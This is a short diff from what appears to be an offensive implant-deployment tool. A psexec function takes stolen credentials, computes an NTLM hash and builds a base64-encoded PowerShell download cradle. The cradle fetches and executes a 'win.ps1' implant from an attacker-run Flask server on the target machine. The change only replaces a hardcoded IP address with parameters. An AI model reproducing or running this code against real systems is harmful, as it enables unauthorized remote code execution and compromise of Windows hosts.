@@ -36,7 +36,7 @@ With valid credentials, psexec and run implant code
 """
 def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
-    payload = 'IEX(New-Object Net.WebClient).downloadString("http://192.168.108.15:5000/static/win.ps1")'
+    payload = f'IEX(New-Object Net.WebClient).downloadString("http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1")'
     b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
     cmd = f"powershell -e {b64}\n"
 
